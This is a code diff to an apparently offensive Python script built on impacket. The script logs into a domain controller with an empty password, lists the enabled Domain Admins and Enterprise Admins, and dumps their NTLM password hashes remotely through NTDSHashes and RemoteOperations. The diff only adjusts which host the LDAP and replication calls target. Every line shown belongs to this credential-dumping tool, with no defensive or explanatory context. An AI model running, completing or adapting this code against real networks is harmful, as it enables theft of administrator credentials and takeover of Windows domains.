@@ -1,5 +1,4 @@
 import sys
-import os
 
 from io import StringIO
 from impacket.ldap import ldap
@@ -10,6 +9,7 @@ class dump():
     def __init__(self, dc_ip, dc, domain):
         self.remoteName = dc_ip
         self.remoteHost = dc_ip
+        self.kdcHost = dc_ip
         self.dcName = dc
         self.domain = domain
 
@@ -22,7 +22,7 @@ class dump():
             baseDN += 'dc=%s,' % i
         # Remove last ','
         baseDN = baseDN[:-1]
-        ldapConnection = ldap.LDAPConnection('ldap://%s' % self.domain, baseDN, None)
+        ldapConnection = ldap.LDAPConnection('ldap://%s'%self.kdcHost, baseDN, self.kdcHost)
         ldapConnection.login(self.dcName, '', self.domain, '', '')
         searchFilter = f"(&(|(memberof=CN=Domain Admins,CN=Users,{baseDN})(memberof=CN=Enterprise Admins,CN=Users,{baseDN}))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
 
@@ -33,7 +33,7 @@ class dump():
 
         # Initialize remoteoperations
         outputFileName = "{}_{}_domain_admins".format(self.dcName, self.remoteHost)
-        remoteOps  = RemoteOperations(smbConnection=smbConnection, doKerberos=False, kdcHost=None, ldapConnection=ldapConnection)
+        remoteOps  = RemoteOperations(smbConnection=smbConnection, doKerberos=False, kdcHost=self.kdcHost, ldapConnection=ldapConnection)
         nh = NTDSHashes(None, None, isRemote=True, history=False,
                                         noLMHash=False, remoteOps=remoteOps,
                                         useVSSMethod=False, justNTLM=True,
